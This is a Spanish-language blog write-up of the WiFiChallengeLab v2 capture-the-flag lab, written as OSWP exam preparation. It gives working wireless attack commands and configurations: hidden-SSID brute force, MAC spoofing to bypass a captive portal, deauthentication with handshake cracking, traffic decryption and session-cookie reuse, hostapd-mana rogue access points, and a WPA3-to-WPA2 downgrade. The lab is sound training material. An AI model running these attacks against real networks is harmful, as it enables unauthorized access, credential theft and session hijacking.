---
layout: single
title: WifiChallengeLab v2
excerpt: "En este post vamos a estar resolviendo retos de los WifiChallenges de versión 2 para seguir con la preparacion para la certificacion OSWP de offensive Security en esta version el laboratorio es mas estable y podemos hacer los ataques de manera correcta aprendiendo nuevos ataques y nuevas herramientas que nos ayudaran a resolver estos retos"
date: 2023-10-15
classes: wide
toc: true
toc_label: "Contenido"
toc_icon: "fire"
header:
  teaser: /assets/images/wifi-challenge-lab2/panda.png
  teaser_home_page: true
categories:
  - Hacking Wifi
tags:  
  - Hacking Wifi 
---

## Introduction

Como primer reto nos piden simplemente mostrar el contenido de la **flag.txt** ademas nos dan la ruta para mostrarla

Una forma de obtenerla rápidamente es conectándonos desde nuestra maquina por **ssh** o simplemente verla en la maquina virtual que descargamos (Tu ip sera diferente)

```bash
❯ ssh user@192.168.255.134
The authenticity of host '192.168.255.134 (192.168.255.134)' can't be established.
ECDSA key fingerprint is SHA256:4ddSKhR7btIEcJPQZLhiikHN88xz2Y8gP0QgXswc340.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.255.134' (ECDSA) to the list of known hosts.
user@192.168.255.134's password: 

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

user@WiFiChallengeLab:~$ sudo su
root@WiFiChallengeLab:/home/user# 
root@WiFiChallengeLab:/home/user# export TERM=xter
root@WiFiChallengeLab:/home/user# cd
root@WiFiChallengeLab:~# ls
flag.txt  go  restartWiFi.sh  rockyou-top100000.txt  tools  top-usernames-shortlist.txt  updateWiFiChallengeLab.sh
root@WiFiChallengeLab:~# 
```

Completamos el reto

![](/assets/images/wifi-challenge-lab2/web1.png)

## Recon

![](/assets/images/wifi-challenge-lab2/web2.png)

Primeramente nos piden sabes el canal donde el **AP** **wifi-global** esta a si que lo primero que vamos a hacer es iniciar el modo monitor

```bash
❯ airmon-ng start wlan0
❯ airmon-ng check kill
```

Ahora vemos que ya esta en modo monitor

![](/assets/images/wifi-challenge-lab2/web3.png)

Lo primero que vamos a hacer para poder ver el canal en el que opera este **AP** es simplemente ejecutar lo siguiente

```bash
❯ airodump-ng --band abg --wps wlan0mon
```

Y listo hay podemos ver que opera en el canal **44** y completamos el reto 

![](/assets/images/wifi-challenge-lab2/web4.png)

# 02 What is the MAC of the wifi-IT client?

Ahora vemos que nos piden la **MAC** del cliente asociado al **AP** **wifi-IT** 

Vamos a capturar el trafico de esa red en especifica poder ver los clientes si analizamos la captura pasada vemos que esta operando en el canal **11**

```bash
❯ airodump-ng --band abg --essid wifi-IT -c 11 wlan0mon
```

Hay podemos ver la dirección **MAC** del cliente asociado

![](/assets/images/wifi-challenge-lab2/web5.png)

#  03. What is the probe of 78:C1:A7:BF:72:46?

Ahora necesitamos saber a que **AP** esta asociado el cliente con esa **MAC** para eso simplemente nos pondremos a capturar con `airodump` 

```bash
❯ airodump-ng --band abg --wps wlan0mon
```

Hay podemos ver el **AP**

![](/assets/images/wifi-challenge-lab2/web6.png)

# 04. What is the ESSID of the hidden AP (mac F0:9F:C2:6A:88:26)?

Ahora nos piden el **essid** del **AP** que esta escondido pero aun así nos dan su dirección **MAC** con eso ya tenemos ventaja, lo primero que vamos a hacer es usar `airodump-ng` para ponernos a capturar el trafico filtrando directamente por esa dirección **MAC** y ver la longitud del nombre del **AP**

```bash
❯ airodump-ng --band abg --bssid F0:9F:C2:6A:88:26 wlan0mon
```

Vemos que tiene 9 caracteres de longitud y opera en el canal **11**

![](/assets/images/wifi-challenge-lab2/web7.png)

Para poder obtener el nombre usando el `rockyou.txt` primero tenemos que parar la antena de red 

```bash
❯ airmon-ng stop wlan0mon
```

Ahora vamos a iniciar la interfaz en el canal **11**

```bash
❯ airmon-ng start wlan0 11
```

Una vez hecho esto ahora si podemos usar `mdk4` para obtener el **SSID**

```bash
❯ mdk4 wlan0mon p -t F0:9F:C2:6A:88:26 -f rockyou-top100000.txt
```

Aunque para ir mas rápido como sabemos que tiene **9** podemos filtrar por **wifi** para obtener el nombre del **AP** mas rápido

```bash
❯ cat rockyou-top-100000.txt | awk '{print "wifi-" $1}' > brute.txt
```

Y así obtenemos el nombre mas rápido 

![](/assets/images/wifi-challenge-lab2/web8.png)

## OPN 

Bueno como tal el primero challenge que es el **05** se enfoca en **OPN** **networks** ya que se trata de un portal cautivo para conectarnos al **AP** vamos a usar `wpa_supplicant` y crearemos un **.conf** 

```bash
network={
	ssid="wifi-free"
	key_mgmt=NONE
	scan_ssid=1
}
```

Ahora vamos usar `wpa_supplicant` y le indicaremos el `driver` , la interfaz y archivo **.conf**

```bash
❯ wpa_supplicant -D nl80211 -i wlan1 -c free.conf
```

![](/assets/images/wifi-challenge-lab2/zi.png)

Ahora vamos asignarnos una **IP** por **dhclient** ala interfaz que digitamos

```bash
❯ dhclient wlan1 -v
```

Ahora sabemos la **IP** a donde hace la petición que es la **192.168.16.1**

![](/assets/images/wifi-challenge-lab2/zi2.png)

Ahora usamos las credenciales por defecto **admin:admin**

![](/assets/images/wifi-challenge-lab2/zi3.png)

Y una vez conectados vemos la **flag**

# 06 What is the flag on the AP router of the wifi-guest network?

Ahora nos piden obtener la flag del **AP** **wifi-guest** que ya nos están dando el nombre si comenzamos con un `airodum-ng wlan0mon` nos daremos cuenta que esta en el canal **6** ahora lo que haremos es capturar el trafico y exportarlo a un archivo

```bash
❯ airodump-ng wlan0mon --band abg --essid wifi-guest -c 6 -w captura
```

Vemos que hay varios clientes asociados

![](/assets/images/wifi-challenge-lab2/zi4.png)

Para poder conectarnos vamos a crear un **.conf** otra vez

```bash
network={
		ssid="wifi-guest"
		key_mgmt=NONE
}
```

Ahora ejecutamos el `wpa_supplicant`

```bash
❯ wpa_supplicant -D nl80211 -i wlan2 -c guest.conf
```

![](/assets/images/wifi-challenge-lab2/zi5.png)

Ahora vamos asignarnos **IP** otra vez

```bash
❯ dhclient wlan2 -r
❯ dhclient wlan2 -v
```

![](/assets/images/wifi-challenge-lab2/zi6.png)

Ahora vamos acceder ala **IP** del router y usar las credenciales por defecto pero no funcionan

![](/assets/images/wifi-challenge-lab2/zi7.png)

Lo que podemos hacer es un **Bypass** simplemente cambiando nuestra dirección **MAC** ala de un cliente que ya este asociado al **AP** como ya vimos en la captura hay 3 a si que tomaremos la dirección **MAC** de alguno

Primero vamos a dar de baja la interfaz

```bash
❯ ifconfig wlan2 down
```

Ahora nos cambiamos la **MAC**

```bash
❯ macchanger -m b0:72:bf:44:b0:49 wlan2
```

Ahora volvemos a correr el `wpa_supplicant`

```bash
❯ wpa_supplicant -D nl80211 -i wlan2 -c guest.conf
```

Ahora nos volvemos asignar **IP**

```bash
❯ dhclient wlan2 -r
❯ dhclient wlan2 -v
```

Ahora si accedemos al panel vemos que nos carga el correcto

![](/assets/images/wifi-challenge-lab2/zi8.png)

Pero bueno como tal las credenciales por defecto no funcionan a si que lo que haremos es básicamente abrir la captura con **wireshark** y filtrar por trafico **http** para ver si algún cliente inicio sesión y nos comparten las credenciales

![](/assets/images/wifi-challenge-lab2/zi9.png)

## WEP 

>WEP is obsolete

<https://shuciran.github.io/posts/Attacking-WEP/>

## PSK 

Ahora vamos a hacer el siguiente desafió donde nos piden obtener la contraseña del **AP** **wifi-mobile**

![](/assets/images/wifi-challenge-lab2/psk1.png)

```bash
❯ airodump-ng wlan0mon -w captura --band -abg 
```

Hay vemos que esta el **AP** corriendo que usa **WPA2/PSK** ademas de que tiene clientes asociados y corre en el canal **6**

![](/assets/images/wifi-challenge-lab2/psk2.png)

Ahora en otra ventana vamos a usar `aireplay-ng` para desautenticar a los clientes y cuando se autentiquen otra vez obtener el **handshake**

```bash
❯ iwconfig wlan0mon channel 6
❯ aireplay-ng -0 10 -a F0:9F:C2:71:22:12 wlan0mon
```

Ahora paramos el `airodump-ng` y iniciamos el ataque pero ahora agregando el `-c 6` por que sabemos que esta en ese canal

Ahora enviamos los paquetes

![](/assets/images/wifi-challenge-lab2/psk3.png)

Y obtenemos el **handshake**

![](/assets/images/wifi-challenge-lab2/psk4.png)

Ahora podemos usar `aircrack-ng` para obtener la contraseña 

```bash
❯ aircrack-ng captura-02.cap -w ~/rockyou-top100000.txt
```

Y listo

![](/assets/images/wifi-challenge-lab2/psk5.png)

# What is the IP of the web server in the wifi-mobile network?

Ahora nos piden saber cual es la ip del **web server** que hay en **wifi-mobile** como tenemos un **handshake** y la contraseña podemos desencriptar el trafico de los usuarios para eso usaremos `airdecap-ng` y filtraremos con `wireshark` por trafico `http`

```bash
❯ airdecap-ng -e wifi-mobile -p starwars1 captura-03.cap
```

![](/assets/images/wifi-challenge-lab2/mike1.png)

Y nos crea un **dec.cap**

Ahora lo abrimos con `wireshark` y filtramos por trafico **http** y podemos ver la **IP** ademas de ver una **cookie** de sesión es bueno guardarla

![](/assets/images/wifi-challenge-lab2/mike2.png)

# what is the flag after login in wifi-mobile?

Ahora nos piden usar la cookie que obtuvimos para conectarnos y obtener la flag

![](/assets/images/wifi-challenge-lab2/juan1.png)

Lo primero que vamos a hacer es conectarnos al **AP** con **wpa_supplicant**

```bash
network={
    ssid="wifi-mobile"
    psk="starwars1"
    scan_ssid=1
    key_mgmt=WPA-PSK
    proto=WPA2
}
```

Ahora corremos `wpa_supplicant`

```bash
❯ wpa_supplicant -Dnl80211 -iwlan3 -c info.conf
```

Ahora nos asignamos **IP** con **dhclient** 

```bash
❯ dhclient wlan3 -v
```

![](/assets/images/wifi-challenge-lab2/juan2.png)

Ahora podemos acceder pero tenemos que cambiar la **cookie** para poder ver la flag en la parte de **storage** en **firefox** puedes cambiar la cookie

Una vez este cambiada simplemente cambiamos la **URL** para ir a **lab.php**

![](/assets/images/wifi-challenge-lab2/joder.png)

# Is there client isolation in the wifi-mobile network?

Ahora nos piden obtener la flag de otro cliente en el **web-server** para esto simplemente usaremos `arp-scan` para ver clientes conectanos a nuestra red por la interfaz que definimos

```bash
❯ arp-scan -I wlan3 -l
```

Hay vemos las **IP**

![](/assets/images/wifi-challenge-lab2/siuu1.png)

Ahora simplemente hacemos una petición con `curl` y obtenemos la `flag`

```bash
❯ curl 192.168.2.7
```

![](/assets/images/wifi-challenge-lab2/natakong.png)

# What is the wifi-offices password?

Ahora tenemos que obtener la contraseña del **AP** **wifi-offices** si iniciamos con un `airodump-ng wlan0mon --band abg` no veremos el **AP** 

![](/assets/images/wifi-challenge-lab2/cherry.png)

Algo que podemos hacer es crear  un **Fake AP** utilizando **hostapd-mana** para obtener el **handshake** básicamente cuando un cliente se quiera conectar a ese **AP** se conectara al de nosotros realmente, así que vamos a crear un `.conf` para poder hacer esto 

```bash
interface=wlan1
driver=nl80211
hw_mode=g
channel=1
ssid=wifi-offices
mana_wpaout=hostapd.hccapx
wpa=2
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP CCMP
wpa_passphrase=12345678
```

Ahora usamos `hostapd-mana` para que el **AP** funcione correctamente

```bash
❯ hostapd-mana host.conf
```

![](/assets/images/wifi-challenge-lab2/mana.png)

Ahora usaremos **hashcat**

```bash
❯ hcxhash2cap --hccapx=hostapd.hccapx -c aux.pcap 
```

Y tenemos la contraseña 

![](/assets/images/wifi-challenge-lab2/noo.png)

## SAE 

Vamos con el primer reto de este apartado el numero 13 **What is the wifi-management password?** nos dicen que ya es **SAE WPA3** 

![](/assets/images/wifi-challenge-lab2/madrid.png)

![](/assets/images/wifi-challenge-lab2/info.png)

Si hacemos un `airodump-ng wlan0mon` vemos que hay tenemos la red que nos interesa y utiliza **SAE** sin embargo existe una herramienta que tenemos instalada en el laboratorio que nos automatiza todo esto <https://github.com/blunderbuss-wctf/wacker>

Aquí vemos lo que nos pide 

![](/assets/images/wifi-challenge-lab2/guera.png)

Con esto nos ayuda a obtener la contraseña 

![](/assets/images/wifi-challenge-lab2/todas.png)

# What is the wifi-IT password?

Ahora nos piden la contraseña 

![](/assets/images/wifi-challenge-lab2/pero.png)

Nos están diciendo **Downgrade** que significa cambiar la configuración de una red que esta en **WPA3** a **WPA2** hay veces que dispositivos aun no aceptan **WPA3** con esto cambias la configuración para si algún cliente no puede usar **WPA3** use **WPA2** vamos a configurar un **AP** que va a poder usar autenticacion **WPA2** cuando el cliente se conecte podremos obtener el **handshake** lo haremos de la siguiente forma

Primero crearemos un **.conf** para usar **hostapd-mana** esto crea un **AP** malicioso que va a operar en la interfaz **wlan1** y el nombre sera **wifi-IT** como tal lo que estamos haciendo es crear un **AP** con el mismo nombre de la red pero le estamos diciendo que estamos usando **WPA2** en vez de **WPA3** para poder así obtener la contraseña estamos engañando al cliente ademas hay que recordar que hacemos esto por que en el protocolo **WPA3** ya no use el **handshake** para que a si sea mas segura la red wifi

```bash
interface=wlan1
driver=nl80211
hw_mode=g
channel=11
ssid=wifi-IT
mana_wpaout=hostapd-management.hccapx
wpa=2
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP CCMP
wpa_passphrase=12345678
```

De primeras vemos que hay un cliente que esta conectado a ese **AP**

![](/assets/images/wifi-challenge-lab2/mami.png)

Ahora ejecutamos el **hostapd-mana** vamos a exportar el archivo en formato **hccapx** para poder usar **hashcat** y obtener la contraseña

```bash
❯ hostapd-mana hostapd-sae.conf
```

Ahora vamos a deautenticar al cliente esto solo funcionara en caso de que esto este desactivado

![](/assets/images/wifi-challenge-lab2/alv.png)

Vamos a configurar todo antes para que la interfaz donde esta en el modo monitor se ponga en el canal 11 

```bash
❯ iwconfig wlan0mon channel 11
```

Ahora simplemente usamos **aireplay-ng** para deautenticar al cliente seria un ataque dirigido por que es directamente a un cliente 

```bash
❯ aireplay-ng wlan0mon -0 0 -a F0:9F:C2:1A:CA:25 -c 10:F9:6F:AC:53:52
```

Una vez ejecutamos vemos que obtenemos que el cliente se reasocie pero a nuestro **AP**

![](/assets/images/wifi-challenge-lab2/jelty.png)

![](/assets/images/wifi-challenge-lab2/morro.png)

Ahora obtenemos la contraseña con **hashcat**

```bash
❯ hashcat -a 0 -m 2500 hostapd-management.hccapx ~/rockyou-top100000.txt --force
```

En caso de que no funcione podemos convertir el hash a otro tipo pero para eso yo prefiero hacerlo en otra maquina virtual a si que me traere el **hash**

Primero vamos a ponerlo en **pcap**

```bash
❯ hcxhash2cap --hccapx=hostapd-management.hccapx -c aux-management.pcap
EAPOLs written to capfile(s): 4 (0 skipped)
```

Ahora extraemos el **22000** hash 

```bash
❯ hcxpcapngtool aux-management.pcap -o hash-management.22000
```

Y ahora si lo crackeamos

```bash
❯ hashcat -a 0 -m 22000 hash-management.22000 /usr/share/wordlists/rockyou.txt --force
hashcat (v6.1.1) starting...

You have enabled --force to bypass dangerous warnings and errors!
This can hide serious problems and should only be done when debugging.
Do not report hashcat issues encountered when using --force.
OpenCL API (OpenCL 1.2 pocl 1.6, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=============================================================================================================================
* Device #1: pthread-Intel(R) Core(TM) i5-1035G1 CPU @ 1.00GHz, 2855/2919 MB (1024 MB allocatable), 2MCU

Minimum password length supported by kernel: 8
Maximum password length supported by kernel: 63

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt
* Slow-Hash-SIMD-LOOP

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 64 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

19644989c9f5d97cc211d0f9057ea5f9:020000000100:10f96fac5352:wifi-IT:bubblegum
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: WPA-PBKDF2-PMKID+EAPOL
Hash.Target......: hash-management.22000
Time.Started.....: Thu Oct  5 19:29:10 2023, (1 sec)
Time.Estimated...: Thu Oct  5 19:29:11 2023, (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:     1705 H/s (4.19ms) @ Accel:128 Loops:512 Thr:1 Vec:16
Recovered........: 1/1 (100.00%) Digests
Progress.........: 1029/14344385 (0.01%)
Rejected.........: 773/1029 (75.12%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: 123456789 -> ILOVEYOU

Started: Thu Oct  5 19:28:52 2023
Stopped: Thu Oct  5 19:29:11 2023
```

## Recon MGT

Bueno ahora nos vamos adentrar el **MGT** **(Management Frame Protection)** es un método de autenticación utilizado en redes inalámbricas, en estas redes los usuarios deben autenticarse antes de permitirles el acceso ala red pero si esta configurado incorrectamente la partes de la autenticacion se realiza en texto plano la información como el nombre de usuario se envía sin cifrar estas redes usan un **TLS Tunnel** que después de la autenticacion se establece el tunel para cifrar las comunicaciones pero el problema de esto es que la información se envía antes de establecer el tunel 

Para el primer reto vamos a estar capturando paquetes para exportarlos y después con `wireshark` o [https://github.com/r4ulcl/wifi_db](https://github.com/r4ulcl/wifi_db) vamos a esperar a que se conecte un cliente para filtrar por paquetes **eap** que es un paquete de red que se utiliza en la autenticacion y la comunicación segura en redes

Primeramente hay vemos el nombre de la red que nos interesa **wifi-regional**

![](/assets/images/wifi-challenge-lab2/sof.png)

Lo que vamos a hacer es ponernos a capturar de forma pasiva en el canal **44** que es donde esta el **AP** y esperar a que un cliente se conecte

```bash
❯ airodump-ng wlan0mon -w zi -c 44 
```

Listo ahora si podemos ir a **wireshark** o **wifi_db**

![](/assets/images/wifi-challenge-lab2/mel.png)

Aquí vemos que el dominio es **CONTOSOREG**

![](/assets/images/wifi-challenge-lab2/estafado.png)

# What is the email address of the server certificate?

Ahora nos piden el **email** para esto vamos a usar una herramienta que se llama **pcapFilter.sh** el **MGT** y el AP envían un certificado al cliente en texto claro esta información es útil por que puedes realizar ataques para crear un certificado falso con los mismos campos para hacer un ataque llamado **RogueAP attack** que funciona para obtener información y corros electrónicos

![](/assets/images/wifi-challenge-lab2/ptm.png)

# What is the EAP method supported by the wifi-global AP?

Ahora nos piden saber los métodos soportados por el **AP** **wifi-global** para eso usaremos <https://github.com/blackarrowsec/EAP_buster>

Hay vemos el método que soporta 

![](/assets/images/wifi-challenge-lab2/sisoy.png)

## MGT (PROXIMAMENTE)

>Pues bueno gracias por leer el post decidi poner la parte de MGT aparte ya que es un area interesante que usa WPA3 que me gustaria dedicar un solo post para esos retos y pues bueno espero y pasen un feliz halloween :jack_o_lantern: en caso de que en su pais lo celebren y bueno no eh estado muy activo subiendo contenido aqui sigo aprendiendo y practicando solo que tambien tengo otras cosas que hacer pero muchas gracias por leer nos vemos cualquier duda pueden contactarme por Discord sin problema <https://mikerega7.github.io/about/#> en ese apartado pueden encontrar mi usuario nos vemos adios :)


